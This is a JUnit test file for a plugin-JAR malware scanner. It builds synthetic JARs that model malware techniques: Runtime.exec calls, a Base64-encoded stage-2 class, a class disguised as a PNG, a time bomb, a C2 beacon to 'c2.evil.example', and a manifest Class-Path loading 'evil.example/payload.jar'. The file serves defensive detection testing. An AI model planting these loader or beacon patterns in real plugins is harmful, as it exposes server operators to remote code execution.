package dev.pluginguard.engine;

import dev.pluginguard.engine.model.Category;
import dev.pluginguard.engine.model.Finding;
import dev.pluginguard.engine.model.ScanResult;
import dev.pluginguard.engine.model.Severity;
import dev.pluginguard.engine.model.Verdict;
import dev.pluginguard.support.JarBuilder;
import dev.pluginguard.support.JarBuilder.Call;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;

import java.util.Base64;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Synthetic malware cases for the Phase&nbsp;1 deep-static detectors: recursive nested-jar analysis,
 * invokedynamic, reflection resolution, decode-and-rescan, disguised payloads, the expanded rule
 * table, the correlation engine and the deeper descriptor/manifest checks. Each case is a hand-built
 * JAR whose classes are never loaded — only parsed.
 */
@SpringBootTest
class Phase1DetectorsTest {

    @Autowired
    AnalysisEngine engine;

    // --- 1.1 Recursive nested JAR ------------------------------------------------------------

    @Test
    void nestedJarMaliciousClassIsAnalyzedAndAttributed() {
        byte[] nested = new JarBuilder()
                .addClass("com/eviltool/Payload", "run",
                        List.of(new Call("java/lang/Runtime", "exec")), List.of())
                .build();
        byte[] jar = new JarBuilder()
                .addClass("com/example/host/HostPlugin")
                .addResource("plugin.yml", descriptor("com.example.host.HostPlugin"))
                .addRawEntry("libs/helper.jar", nested)
                .build();

        ScanResult result = engine.analyze("n1", "host.jar", jar);

        Finding exec = findRule(result, "BYTECODE_RUNTIME_EXEC");
        assertThat(exec).isNotNull();
        assertThat(exec.nestedPath()).isEqualTo("libs/helper.jar!/");
        assertThat(exec.location()).contains("libs/helper.jar!/");
    }

    // --- 1.2 invokedynamic -------------------------------------------------------------------

    @Test
    void customInvokeDynamicBootstrapIsFlaggedAndMethodReferenceCaught() {
        byte[] jar = new JarBuilder()
                .addClassWithIndy("com/x/Indy",
                        new Call("com/evil/Boot", "bootstrap"),
                        new Call("java/lang/Runtime", "exec"))
                .addResource("plugin.yml", descriptor("com.x.Indy"))
                .build();

        ScanResult result = engine.analyze("i1", "indy.jar", jar);

        assertThat(ruleIds(result)).contains("BYTECODE_INDY_CUSTOM_BOOTSTRAP");
        // The Runtime::exec method-handle argument must surface as a normal process-exec finding.
        assertThat(ruleIds(result)).contains("BYTECODE_RUNTIME_EXEC");
    }

    @Test
    void standardLambdaBootstrapIsNotFlagged() {
        byte[] jar = new JarBuilder()
                .addClassWithIndy("com/x/Lam",
                        new Call("java/lang/invoke/LambdaMetafactory", "metafactory"), null)
                .addResource("plugin.yml", descriptor("com.x.Lam"))
                .build();

        ScanResult result = engine.analyze("i2", "lambda.jar", jar);

        assertThat(ruleIds(result)).doesNotContain("BYTECODE_INDY_CUSTOM_BOOTSTRAP");
    }

    // --- 1.6 Reflection resolution -----------------------------------------------------------

    @Test
    void reflectiveResolutionOfDangerousClassIsFlagged() {
        byte[] jar = new JarBuilder()
                .addClass("com/x/Reflect", "go",
                        List.of(new Call("java/lang/Class", "forName")),
                        List.of("java.lang.Runtime"))
                .addResource("plugin.yml", descriptor("com.x.Reflect"))
                .build();

        ScanResult result = engine.analyze("r1", "reflect.jar", jar);

        assertThat(ruleIds(result)).contains("BYTECODE_REFLECTIVE_DANGEROUS_CLASS");
    }

    // --- 1.3 Decode-and-rescan ---------------------------------------------------------------

    @Test
    void base64EncodedClassPayloadIsDecodedAndRescanned() {
        byte[] hidden = JarBuilder.classOf("com/hidden/Stage2",
                List.of(new Call("java/lang/Runtime", "exec")), List.of());
        String encoded = Base64.getEncoder().encodeToString(hidden);

        byte[] jar = new JarBuilder()
                .addClass("com/example/loader/Loader", "load", List.of(), List.of(encoded))
                .addResource("plugin.yml", descriptor("com.example.loader.Loader"))
                .build();

        ScanResult result = engine.analyze("d1", "loader.jar", jar);

        Finding embedded = findRule(result, "DECODE_EMBEDDED_CLASS");
        assertThat(embedded).isNotNull();
        assertThat(embedded.severity()).isEqualTo(Severity.CRITICAL);
        assertThat(embedded.description()).contains("Runtime.exec");
        assertThat(result.verdict()).isEqualTo(Verdict.CRITICAL_RISK);
    }

    @Test
    void hiddenUrlInsideEncodedStringIsFlagged() {
        String encoded = Base64.getEncoder()
                .encodeToString("connect to https://c2.evil.example/beacon now".getBytes());

        byte[] jar = new JarBuilder()
                .addClass("com/example/x/Beacon", "tick", List.of(), List.of(encoded))
                .addResource("plugin.yml", descriptor("com.example.x.Beacon"))
                .build();

        ScanResult result = engine.analyze("d2", "beacon.jar", jar);

        assertThat(ruleIds(result)).contains("DECODE_HIDDEN_IOC");
    }

    // --- 1.4 Embedded / disguised payloads ---------------------------------------------------

    @Test
    void classDisguisedAsImageIsFlagged() {
        byte[] classBytes = JarBuilder.classOf("com/dis/Guised", List.of(), List.of());
        byte[] jar = new JarBuilder()
                .addClass("com/example/art/ArtPlugin")
                .addResource("plugin.yml", descriptor("com.example.art.ArtPlugin"))
                .addRawEntry("assets/logo.png", classBytes)
                .build();

        ScanResult result = engine.analyze("e1", "art.jar", jar);

        Finding disguised = findRule(result, "EMBEDDED_DISGUISED_PAYLOAD");
        assertThat(disguised).isNotNull();
        assertThat(disguised.evidence()).contains("Java class");
    }

    // --- 1.7 Expanded rule table -------------------------------------------------------------

    @Test
    void scriptingJndiAndDeserializationAreDetected() {
        byte[] jar = new JarBuilder()
                .addClass("com/x/Multi", "go", List.of(
                        new Call("javax/script/ScriptEngineManager", "<init>"),
                        new Call("javax/naming/InitialContext", "lookup"),
                        new Call("java/io/ObjectInputStream", "readObject"),
                        new Call("java/lang/reflect/AccessibleObject", "setAccessible"),
                        new Call("java/awt/Robot", "<init>")), List.of())
                .addResource("plugin.yml", descriptor("com.x.Multi"))
                .build();

        ScanResult result = engine.analyze("x1", "multi.jar", jar);

        assertThat(ruleIds(result)).contains(
                "BYTECODE_SCRIPT_ENGINE",
                "BYTECODE_JNDI_LOOKUP",
                "BYTECODE_OBJECT_INPUT_STREAM",
                "BYTECODE_SET_ACCESSIBLE",
                "BYTECODE_AWT_ROBOT");
    }

    @Test
    void timeBombHeuristicFires() {
        byte[] jar = new JarBuilder()
                .addClass("com/x/Bomb", "arm", List.of(
                        new Call("java/util/Timer", "schedule"),
                        new Call("java/time/LocalDate", "now")), List.of())
                .addResource("plugin.yml", descriptor("com.x.Bomb"))
                .build();

        ScanResult result = engine.analyze("t1", "bomb.jar", jar);

        assertThat(ruleIds(result)).contains("BYTECODE_TIME_BOMB");
    }

    // --- 1.5 Correlation ---------------------------------------------------------------------

    @Test
    void networkPlusClassLoadingRaisesRemoteCodeLoaderCombo() {
        byte[] jar = new JarBuilder()
                .addClass("com/x/Loader", "go", List.of(
                        new Call("java/net/HttpURLConnection", "getInputStream"),
                        new Call("java/net/URLClassLoader", "loadClass")), List.of())
                .addResource("plugin.yml", descriptor("com.x.Loader"))
                .build();

        ScanResult result = engine.analyze("c1", "loader.jar", jar);

        Finding combo = findRule(result, "COMBO_REMOTE_CODE_LOADER");
        assertThat(combo).isNotNull();
        assertThat(combo.category()).isEqualTo(Category.COMBO);
        assertThat(combo.severity()).isEqualTo(Severity.CRITICAL);
        assertThat(combo.relatedRuleIds()).isNotEmpty();
        assertThat(result.verdict()).isEqualTo(Verdict.CRITICAL_RISK);
    }

    // --- 1.8 Deeper descriptor / manifest ----------------------------------------------------

    @Test
    void descriptorLoadOrderAndRemoteLibrariesAreFlagged() {
        String yml = """
                name: Early
                version: "1.0"
                main: com.x.Early
                api-version: "1.21"
                load: STARTUP
                loadbefore:
                  - CoreProtect
                libraries:
                  - com.example:secret-lib:1.0
                """;
        byte[] jar = new JarBuilder()
                .addClass("com/x/Early")
                .addResource("plugin.yml", yml)
                .build();

        ScanResult result = engine.analyze("y1", "early.jar", jar);

        assertThat(ruleIds(result)).contains(
                "YML_LOAD_STARTUP", "YML_LOADBEFORE", "YML_REMOTE_LIBRARIES");
    }

    @Test
    void manifestClassPathToRemoteJarIsFlagged() {
        byte[] jar = new JarBuilder()
                .addClass("com/x/Cp")
                .addResource("plugin.yml", descriptor("com.x.Cp"))
                .addResource("META-INF/MANIFEST.MF",
                        "Manifest-Version: 1.0\nClass-Path: http://evil.example/payload.jar\n")
                .build();

        ScanResult result = engine.analyze("m1", "cp.jar", jar);

        Finding cp = findRule(result, "STRUCTURE_MANIFEST_CLASSPATH");
        assertThat(cp).isNotNull();
        assertThat(cp.category()).isEqualTo(Category.SUPPLY_CHAIN);
    }

    // --- False-positive control --------------------------------------------------------------

    @Test
    void benignNestedLibraryDoesNotRaiseCriticalCombos() {
        byte[] nestedLib = new JarBuilder()
                .addClass("com/google/gson/Gson", "toJson",
                        List.of(new Call("java/lang/StringBuilder", "append")), List.of())
                .addResource("META-INF/maven/com.google.code.gson/gson/pom.properties",
                        "groupId=com.google.code.gson\nartifactId=gson\nversion=2.10.1\n")
                .build();
        byte[] jar = new JarBuilder()
                .addClass("com/example/clean/CleanPlugin", "update",
                        List.of(new Call("java/net/HttpURLConnection", "getInputStream")), List.of())
                .addResource("plugin.yml", descriptor("com.example.clean.CleanPlugin"))
                .addRawEntry("libs/gson.jar", nestedLib)
                .build();

        ScanResult result = engine.analyze("b1", "clean.jar", jar);

        assertThat(result.counts().critical()).isZero();
        assertThat(ruleIds(result)).doesNotContain(
                "COMBO_REMOTE_CODE_LOADER", "DECODE_EMBEDDED_CLASS", "EMBEDDED_DISGUISED_PAYLOAD");
        assertThat(result.score()).isGreaterThanOrEqualTo(60);
    }

    // --- helpers -----------------------------------------------------------------------------

    private static String descriptor(String main) {
        return "name: Test\nversion: \"1.0\"\nmain: " + main + "\napi-version: \"1.21\"\n";
    }

    private static Finding findRule(ScanResult result, String ruleId) {
        return result.findings().stream()
                .filter(f -> f.ruleId().equals(ruleId))
                .findFirst()
                .orElse(null);
    }

    private static List<String> ruleIds(ScanResult result) {
        return result.findings().stream().map(Finding::ruleId).toList();
    }
}
